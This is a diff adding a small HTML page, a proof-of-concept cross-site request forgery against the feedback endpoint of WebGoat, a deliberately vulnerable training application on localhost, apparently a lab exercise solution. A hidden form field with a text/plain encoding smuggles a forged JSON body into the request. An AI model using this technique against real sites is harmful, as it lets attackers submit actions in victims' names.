@@ -1,0 +1,10 @@
+<html>
+<tittle>JSON CSRF POC</tittle>
+<center>
+    <h1>JSON CSRF POC</h1>
+    <form action="http://localhost:8080/WebGoat/csrf/feedback/message" method=post enctype="text/plain">
+        <input name='{"name":"prasad", "email":"test@123.com", "content":"Webgoat is best","ignore_me":"' value='test"} 'type='hidden'>
+        <input type='submit' value='submit'>
+    </form>
+</center>
+</html>
